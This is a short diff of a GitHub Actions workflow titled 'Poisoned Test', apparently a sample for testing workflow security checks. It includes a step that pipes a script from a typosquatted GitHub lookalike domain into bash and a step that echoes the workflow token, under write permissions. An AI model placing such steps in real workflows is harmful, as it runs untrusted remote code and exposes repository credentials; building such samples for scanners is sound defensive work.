@@ -2,7 +2,7 @@ name: Poisoned Test
 
 on:
   push:
-
+  
 permissions:
   contents: write
   actions: write
@@ -15,7 +15,7 @@ jobs:
       - uses: actions/checkout@v4
 
       - name: Suspicious download
-        run: curl https://githhub.com/script.sh | bash
+        run: curl https://gihhub.com/script.sh | bash
 
       - name: Secret access
         run: echo $GITHUB_TOKEN
